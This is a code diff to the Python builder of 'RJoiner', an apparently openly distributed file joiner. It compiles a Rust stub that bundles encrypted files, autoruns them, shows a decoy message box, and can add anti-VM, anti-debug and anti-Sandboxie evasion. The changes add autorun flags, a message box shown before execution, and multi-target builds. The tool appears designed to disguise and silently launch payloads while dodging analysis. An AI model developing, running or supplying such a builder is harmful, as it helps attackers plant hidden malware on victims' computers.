@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-l="""
+l='''
   RJoiner assistent to easily build joins
   Copyright (C) 2023  ftdot
 
@@ -16,7 +16,7 @@ l="""
 
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
-"""
+'''
 
 import argparse
 import subprocess
@@ -37,7 +37,7 @@ BANNER = """
   ░░   ░ ░ ░ ░  ░ ░ ░ ▒   ▒ ░   ░   ░ ░    ░     ░░   ░ 
    ░     ░   ░      ░ ░   ░           ░    ░  ░   ░     
                                                         
-      RJoiner v1.3.0 | by ftdot | GNU GPL v3.0
+      RJoiner v1.4.0 | by ftdot | GNU GPL v3.0
       ----------------------------------------
          https://github.com/ftdot/rjoiner
 """
@@ -66,7 +66,7 @@ def main() -> int:
   parser.add_argument('-v', '--version',
                       help='Show version',
                       action='version',
-                      version='RJoiner v1.3.0')
+                      version='RJoiner v1.4.0')
   parser.add_argument('--copyright',
                       help='Show copyright',
                       action='version',
@@ -86,7 +86,8 @@ def main() -> int:
                       default=False)
   
   parser.add_argument('-t', '--target',
-                    help='Specify a target to cargo (list installed targets: rustup target list --installed) (use "all" to specify all targets)',
+                    help='Specify a target to cargo (list installed targets: rustup target list --installed) (can be multiple)',
+                    action='append',
                     default=None)
   
   parser.add_argument('-d', '--debug',
@@ -110,7 +111,7 @@ def main() -> int:
                       default=False)
 
   parser.add_argument('-f', '--file',
-                      help='Path to the file(s) to join (can be multiple)',
+                      help='Path to the file(s) to join (can be multiple) (start filename with "!" to autorun it)',
                       action='append',
                       required=True)
 
@@ -133,6 +134,10 @@ def main() -> int:
   parser.add_argument('-I', '--mbox-icon-type',
                       help='Set icon type of messagebox (available: error, info. By default: error)',
                       default='error')
+
+  parser.add_argument('-b', '--msgbox-before',
+                      help='Shows messagebox before executing joined programs (by default, messagebox will be showed after executing joined programs)',
+                      action='store_true')
 
   parser.add_argument('--anti-vm',
                       help='Enables Anti-VM (only x86)',
@@ -159,6 +164,7 @@ def main() -> int:
     subprocess.check_call('cargo --version')
   except:
     print('You need install Rust to this work!\n\nLink: https://www.rust-lang.org/tools/install')
+    return 1
 
   if args.verbose:
     printv = lambda *a, **kw: print('V:', *a, **kw)
@@ -171,9 +177,10 @@ def main() -> int:
   printv('Checking files to join')
   for f in args.file:
     files.append(pathlib.Path(f))
+    p = pathlib.Path(f.removeprefix('!'))
     
-    if not files[-1].is_file():
-      print("File", files[-1], "doesn't exist or this isn't a file")
+    if not p.is_file():
+      print('File', p, "doesn't exist or this isn't a file")
       return 1
 
   # run compile process
@@ -188,7 +195,7 @@ def main() -> int:
     if args.anti_debug: features.append('anti_debug')
     if args.anti_sandboxie: features.append('anti_sandboxie')
     if args.msgbox:
-      features.append('show_messagebox')
+      features.append('show_messagebox_before' if args.msgbox_before else 'show_messagebox_after')
 
       if args.message is None or args.title is None:
         print('You must provide -m arguments (--message) to use messagebox')
@@ -204,9 +211,6 @@ def main() -> int:
 
     # release parameter
     release_param = [] if args.debug else ['--release', ]
-
-    # target parameter
-    target = [] if args.target is None else ['--target', args.target]
 
     # create temporary directory
     printv('Creating temporary directory')
@@ -224,7 +228,7 @@ def main() -> int:
 
     # copy content from stub directory to temporary directory
     printv('Copying stub directory to temp')
-    shutil.copytree('stub', 'temp', dirs_exist_ok=True, ignore=shutil.ignore_patterns("target"))
+    shutil.copytree('stub', 'temp', dirs_exist_ok=True, ignore=shutil.ignore_patterns('target'))
 
     # copy icon (if any) to temp directory
     printv('Copying icon file to temp/icon.ico')
@@ -241,7 +245,8 @@ def main() -> int:
 
       printv('Copy file', f)
 
-      p = f.name
+      p = f.name.removeprefix('!')
+      f = f.with_name(p)
 
       # check if there is same named files
       if p in same_named:
@@ -251,7 +256,7 @@ def main() -> int:
       if p in files_to_include:
         if not p in same_named: same_named[p] = 0
 
-        name_s = p.split(".")
+        name_s = p.split('.')
         ext = ''
 
         # get name and extension splitted
@@ -283,15 +288,18 @@ def main() -> int:
 
     # generate code to generate code xD
     printv('Generating code')
-    gen_code = '\n    '.join([f'match read_n_encrypt_file("{f}", &key) {{\n        Some(r) => {{ code_vec.push(r); }}\n        None => {{ println!("Cannot add file {f}"); }}\n    }}' for f in files_to_include])
+    gen_code = '\n    '.join([(ar:='true' if f.startswith('!') else 'false', fn:=f[1:] if f.startswith('!') else f, f'match read_n_encrypt_file("{fn}", &key, {ar}) {{\n        Some(r) => {{ code_vec.push(r); }}\n        None => {{ println!("Cannot add file {fn} autorun: {"yes" if ar else "no"}"); }}\n    }}')[2] for f in files_to_include])
     with open('build.rs', 'r') as f:
       build_rs_content = f.read()
     
     # generating code for messagebox (if it is enabled)
     if args.msgbox:
+      title = args.title.replace('\\', '\\\\\\\\').replace('"', '\\\\\\"')
+      message = args.message.replace('\\', '\\\\\\\\').replace('"', '\\\\\\"')
+
       printv('Generating code for messagebox')
-      build_rs_content = build_rs_content.replace('--msgbox-title-build--', args.title) \
-                                         .replace('--msgbox-text-build--', args.message) \
+      build_rs_content = build_rs_content.replace('--msgbox-title-build--', title) \
+                                         .replace('--msgbox-text-build--', message) \
                                          .replace('--msgbox-type-build--', args.mbox_icon_type.lower().capitalize())
 
     # generating code for commands (if any)
@@ -301,7 +309,7 @@ def main() -> int:
       commands_code = []
 
       for c in args.command:
-        command_code = 'code_vec.push(add_command("{0}"));'.format(c.replace("\\", "\\\\"))
+        command_code = 'code_vec.push(add_command("{0}"));'.format(c.replace('\\', '\\\\'))
 
         commands_code.append(command_code)
       
@@ -315,13 +323,21 @@ def main() -> int:
 
     # disable backtrace if debug mode is disabled
     if not args.debug:
-      printv("Rust backtrace disabled")
+      printv('Rust backtrace disabled')
       os.environ['RUST_BACKTRACE'] = '0'
 
-    # run build command
-    command = ['cargo', 'build', '--target-dir', '../out'] + release_param + features_ + target + (['-vv'] if args.verbose else [])
-    printv('Call command:', *command)
-    r = subprocess.call(command, stdout=sys.stdout, stderr=sys.stderr)
+    # check if target is None
+    if args.target is None: args.target = [None, ]
+
+    # build joiner by all specified targets
+    for t in args.target:
+      print('Compiling for target:', t)
+
+      t = [] if t is None else ['--target', t]
+      # run build command
+      command = ['cargo', 'build', '--target-dir', '../out'] + release_param + features_ + t + (['-vv'] if args.verbose else [])
+      printv('Call command:', *command)
+      r = subprocess.call(command, stdout=sys.stdout, stderr=sys.stderr)
 
     # change directory back
     os.chdir('..')
